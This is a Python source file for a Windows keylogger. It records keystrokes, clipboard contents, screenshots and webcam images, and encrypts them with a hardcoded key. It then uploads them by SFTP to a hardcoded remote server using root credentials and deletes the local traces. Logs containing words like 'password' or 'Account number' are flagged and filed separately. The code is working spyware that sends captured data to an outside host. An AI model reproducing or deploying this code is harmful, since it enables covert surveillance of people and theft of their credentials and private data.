# Libraries
import os
import time

import cv2
import pysftp
import win32clipboard
from PIL import ImageGrab
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener

keys_information = "key_log.txt"
clipboard_information = "clipboard.txt"
camera_information = ""
screenshot_information = ""

time_iterations = 200
number_of_iterations_end = 20

myHostname = "139.59.41.58"  # change this
myUsername = "root"  # change this
myPassword = "#1Appliedproject"  # change this #should be 8 characters or more including special characters
log_dir = '/home/keylogger_log/log/'
threat_dir = '/root/threat/'

i = 0  # global variable to change the name of image as we click

directory = "C:\\Users\\Public\\"
extend = "\\"
dir_name = "Log Files"
path = os.path.join(directory, dir_name)
try:
    os.makedirs(path, exist_ok=True)
    print("Directory Created")
except OSError as error:
    pass

file_path = path + extend


# only string will be recorded
def copy_clipboard():
    with open(file_path + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data + "\n")
        except:
            f.write("Clipboard Data could not be retrieved or Clipboard is empty")


# Captures Webcam using cv2 module
def capture_webcam():
    camera = cv2.VideoCapture(0)
    time_str = time.strftime("IMG_%Y%m%d_%H%M%S.png")  # To save each image with the time stamp
    check, frame = camera.read()
    cv2.waitKey(0)  # waits 0 milliseconds after each keypress
    camera.release()
    cv2.imwrite(file_path + extend + time_str + camera_information, frame)


# Capture Screenshots using imgrb or pyscreenshot module
def screenshots():
    imgrb = ImageGrab.grab()
    time_str = time.strftime("SGB_%Y%m%d_%H%M%S.png")  # To save each image with the time stamp
    imgrb.save(file_path + extend + time_str + screenshot_information)


# Encrypting all files in a specific directory using the fernet library6
def encrypt_files():
    key = "BhbZu8TldX1E7eFjhfkppHVmbu7xZaW0XKMOI-eLXU4="  # Key used to encrypt and decrypt the files
    folders = [j for j in os.listdir(file_path) if os.path.isfile(os.path.join(file_path, j))]

    for j in folders:
        x = "\\"
        z = file_path + j
        with open(z, 'rb') as f:
            data = f.read()
            fernet = Fernet(key)
            encrypted = fernet.encrypt(data)
            with open(z, 'wb') as f:
                f.write(encrypted)
                print(z)
                z = file_path


# Sftp the files to server
def sftp_files_threat():
    with pysftp.Connection(host=myHostname, port=2323, username=myUsername, password=myPassword) as sftp:
        try:
            print("Connection Successfully Established")
            sftp.chdir(threat_dir)
            time_str = time.strftime("Threat_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
            sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
            print("Directory created")
            sftp.chdir(time_str)
            slash = "/"
            new_path = sftp.pwd
            sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
            sftp.close()
        except AttributeError as e:
            print("NO connection", e.__class__, "occurred.")
            pass


def sftp_files_log():
    with pysftp.Connection(host=myHostname, port=2323, username=myUsername, password=myPassword) as sftp:
        try:
            print("Connection Successfully Established")
            sftp.chdir(log_dir)
            time_str = time.strftime("Log_%Y_%m_%d_%H:%M")  # creates a time stamp to be used
            sftp.mkdir(time_str)  # Creates a directory in the server with the time stamp as the name
            print("Directory created")
            sftp.chdir(time_str)
            slash = "/"
            new_path = sftp.pwd
            sftp.put_d(file_path, new_path + slash, preserve_mtime=False)  # Transfer files from workstation
            sftp.close()
        except AttributeError as e:
            print("NO connection", e.__class__, "occurred.")
            pass


# Delete files from the local pc or workstation
def delete_files():
    for file_name in os.listdir(file_path):
        file = file_path + file_name
        if os.path.isfile(file):
            print('Deleting file:', file)
            os.remove(file)
        else:
            pass


# Read the log file to find any mentioned threats
def read_file():
    string1 = ['Account number', 'Mobile number', 'password', 'gender', 'NIC', 'username']  # mentioned threats
    # open text file
    with open(file_path + keys_information, "r") as logfiles:
        for line in logfiles:
            if any(keyword in line for keyword in string1):
                print(line)
                print("these words were found, storing in Threat Directory")
                # If the words are found in the log file it will run these function
                logfiles.close()
                encrypt_files()
                sftp_files_threat()
                delete_files()
                print("Encrypted and stored in Threat dir")
                break

            else:
                print("no words were found, storing in Log Directory")
                # If the words are not found in the log file it will run these function
                logfiles.close()
                encrypt_files()
                sftp_files_log()
                delete_files()
                print("Encrypted and stored in Log dir")
                break

    # closing text file
    logfiles.close()


number_of_iterations = 0
currentTime = time.time()
stopTime = time.time() + time_iterations

while number_of_iterations < number_of_iterations_end:  # The keylogger will run until the maximum iteration is met

    count = 0
    keys = []


    def on_press(key):
        global keys, count, currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    # writes captured key stokes to a file
    def write_file(keys):
        with open(file_path + extend + keys_information, "a") as f:
            for key in keys:
                k = str(key).replace("'", "")
                if k == "Key.space":  # changes any space key found to ' ' to make it readable
                    f.write(' ')
                    f.close()
                elif k == "Key.backspace":  # changes any space key found to ' ' to make it readable
                    # f.seek(0, 2)
                    # size = f.tell()
                    # f.truncate(size -1)
                    # f.close()
                    f.write('(BS)')
                elif k.find("enter") > 0:  # changes any enter key found to '\n' (new line) to make it readable
                    f.write('\n')
                    f.close()
                elif k.find("delete") > 0:
                    f.write("(DEL)")
                    f.close()
                elif k.find('up') > 0:
                    f.write("")
                    f.close()
                elif k.find('down') > 0:
                    f.write("")
                    f.close()
                elif k.find('left') > 0:
                    f.write("")
                    f.close()
                elif k.find('right') > 0:
                    f.write("")
                    f.close()
                elif k.find('shift') > 0:
                    f.write("")
                    f.close()
                elif k.find('ctrl') > 0:
                    f.write("")
                    f.close()
                elif k.find('alt') > 0:
                    f.write("")
                    f.close()
                elif k.find("Keys") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if key == Key.esc:
            return False
        if currentTime > stopTime:
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    # order of the functions which will run one at a time
    if currentTime > stopTime:
        screenshots()
        copy_clipboard()
        capture_webcam()
        read_file()

        number_of_iterations += -1

        currentTime = time.time()
        stopTime = time.time() + time_iterations
